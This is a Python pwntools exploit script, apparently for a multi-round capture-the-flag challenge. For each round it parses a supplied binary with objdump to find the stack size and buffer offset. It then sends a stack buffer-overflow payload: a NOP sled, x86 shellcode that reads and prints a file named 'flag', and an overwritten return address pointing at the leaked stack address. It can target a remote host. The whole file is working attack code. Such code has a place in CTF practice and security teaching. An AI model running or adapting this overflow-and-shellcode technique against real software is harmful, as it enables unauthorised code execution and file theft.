#!/usr/bin/env python

from pwn import *
import sys

def solve_round(x):
	if len(sys.argv) > 1:
		r.recvuntil('-> Round ' + str(x) + '\n')
		binary = r.recvuntil('I am running this binary for you in chroot\n')
		r.recvuntil('taking input at: ')
		addr = int(r.recvline().strip(), 16)

		outfile = open('round_' + str(x) + '_drop', 'w')
		outfile.write(binary)
		outfile.close()
	else:
		r.recvuntil('taking input at: ')
		addr = int(r.recvline().strip(), 16)
		log.info("Stack at: " + hex(addr))
		binary = open('round_' + str(x) + '_drop', 'r').read()

	entry = u32(binary[0x18:0x18+4])
	log.info("Entry point: " + hex(entry))
	output = subprocess.Popen(["objdump", "-d", "-M", "intel", "round_" + str(x) + "_drop"], stdout=subprocess.PIPE).communicate()[0].split('\n')

	for line in range(len(output)):
		if hex(entry)[2:]+':' in output[line]:
			for i in range(15):
				if 'call' in output[line+i]:
					main = output[line+i-1].split(' ')[-1][2:]
					log.info("Main at: " + main)

	for line in range(len(output)):
		if main[2:]+':' in output[line]:
			for i in range(8):
				if 'sub' in output[line+i]:
					stack = output[line+i].split('esp,')[1].strip()
					stack = int(stack, 16) + 8
					log.info("Stack size: " + hex(stack))
				if 'lea' in output[line+i]:
					offset = output[line+i].split('lea')[1].split(',')[1].split('+')[1].strip(']')
					offset = int(offset, 16)
					log.info("Offset size: " + hex(offset))
					break

	r.recvuntil('You got the pwn?')

	shellcode = ("\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
				"\xeb\x32\x5b\xb0\x05\x31\xc9\xcd"
				"\x80\x89\xc6\xeb\x06\xb0\x01\x31"
				"\xdb\xcd\x80\x89\xf3\xb0\x03\x83"
				"\xec\x01\x8d\x0c\x24\xb2\x01\xcd"
				"\x80\x31\xdb\x39\xc3\x74\xe6\xb0"
				"\x04\xb3\x01\xb2\x01\xcd\x80\x83"
				"\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"
				"\xff"
				"flag\x00")

	stack = stack - offset

	payload = '\x90' * (stack - len(shellcode) - 16)
	payload += shellcode
	payload += '\x90' * 16
	payload += p32(addr) * 2

	r.sendline(payload)



def exploit(r):
	for i in range(1, 33):
		solve_round(i)
	r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/hackon/round_1_drop'])
        print util.proc.pidof(r)
        pause()
        exploit(r)